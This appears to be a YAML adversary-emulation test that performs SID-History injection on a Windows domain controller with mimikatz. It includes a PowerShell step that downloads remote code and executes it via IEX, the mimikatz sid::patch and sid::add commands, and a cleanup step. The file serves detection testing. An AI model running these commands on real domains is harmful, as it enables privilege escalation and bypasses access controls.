api_version: "2.0"
name: Injection SID-History with mimikatz
description: |
    Adversaries may use SID-History Injection to escalate privileges and bypass access controls. Must be run on domain controller
args:
    - name: sid_to_inject
      type: string
      default: S-1-5-21-1004336348-1177238915-682003330-1134
    - name: sam_account_name
      type: string
      default: $env:username
    - name: mimikatz_path
      type: path
      default: PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe
uuid: 6bef32e5-9456-4072-8f14-35566fb85401
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
        - 'TA0004: Privilege Escalation'
    techniques:
        - 'T1134: Access Token Manipulation'
    subtechniques:
        - 'T1134.005: SID-History Injection'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})
      inline: "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {{[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n}}\n"
      executor: powershell
    - name: injection-sid-history-with-mimikatz
      inline: |
        {{.Args.mimikatz_path}} "privilege::debug" "sid::patch" "sid::add /sid:{{.Args.sid_to_inject}} /sam:{{.Args.sam_account_name}}" "exit"
      executor: command_prompt
      cleanup:
        inline: |
            {{.Args.mimikatz_path}} "sid::clear /sam:{{.Args.sam_account_name}}" "exit"
        executor: command_prompt
